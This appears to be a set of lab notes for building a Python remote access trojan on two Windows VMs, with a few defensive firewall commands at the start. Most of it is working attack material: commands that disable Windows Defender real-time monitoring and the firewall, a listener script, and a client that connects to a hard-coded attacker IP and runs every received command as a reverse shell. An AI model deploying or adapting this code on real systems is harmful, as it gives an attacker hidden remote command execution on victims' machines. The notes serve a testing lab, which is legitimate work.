### PowerShell
```bash
Get-NetTCPConnection -RemoteAddress 10.28.0.149 | Select-Object OwningProcess, State # Find which program is connecting to 10.28.0.149
Get-Process -Id <OwningProcess> | Select-Object Name, Path
```


### Block the Attacker’s IP
```bash
# Block all outbound traffic to the attacker
New-NetFirewallRule -DisplayName "Block Attacker" -Direction Outbound -RemoteAddress 10.28.0.149 -Action Block
```


---
### Remote Access Trojan (RAT) 

Network Testing - Two machines (or VMs) on the same network
- WINServer22-1 : Server
- WINServer22-2 : Client / Victim



Find the **server's local IP** (ipconfig on Windows / ifconfig on Linux).
- Replace "attacker_ip_here" in client.py with the server’s IP.
- Attacker IP: 208.8.8.140 (IPv4 Address)
port 5555 - firewall port



Disable the Windows Security Threat (only if enabled):

```bash
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
```


```
#Enable
Set-MpPreference -DisableRealtimeMonitoring $false
```

Disable the Firewall of the Server
```bash
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

Ping the server IP (from client's terminal)
```bash
# Command Prompt
ping 208.8.8.140
```


Enable telnet in Windows Powershell
```bash
Enable-WindowsOptionalFeature -Online -FeatureName "TelnetClient"
```


Check if the port (5555) is listening:
```bash
Check if the port (5555) is listening:
```



## `server.py`
- This listens for incoming connections on port `5555`
- Firewall must allow inbound connections on port `5555`
  
Example PowerShell command to allow the port:
```bash
New-NetFirewallRule -DisplayName "PythonTest" -Direction Inbound -LocalPort 5555 -Protocol TCP -Action Allow
```

```python
# server.py
# server.py - Run on the ADMIN machine
import socket

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 5555))  # Listen on all network interfaces
    s.listen(1)
    print("[*] Waiting for connection...")
    
    conn, addr = s.accept()
    print(f"[+] Connected to {addr}")
    
    try:
        while True:
            cmd = input("admin$ ")
            if cmd.lower() == 'exit':
                conn.send(cmd.encode())
                break
            conn.send(cmd.encode())
            print(conn.recv(4096).decode())  # Larger buffer for big outputs
    finally:
        conn.close()
        s.close()

if __name__ == "__main__":
    start_server()

```

## `client.py `
- The client initiates the connection to the `server’s IP` (208.8.8.140)
- No need to disable the client’s firewall (outbound connections are usually allowed by default).


```python
# client.py

# client.py - Run on the TARGET machine
import socket
import subprocess

def connect_to_server(server_ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, port))
            print(f"[*] Connected to {server_ip}")
            
            while True:
                command = s.recv(4096).decode().strip()
                if command.lower() == 'exit':
                    s.close()
                    break
                
                try:
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())
                    
        except (ConnectionError, socket.error):
            print("[!] Connection lost. Reconnecting...")
            continue

if __name__ == "__main__":
    SERVER_IP = "208.8.8.140"  # Change to the server's real IP
    PORT = 5555
    connect_to_server(SERVER_IP, PORT)

```
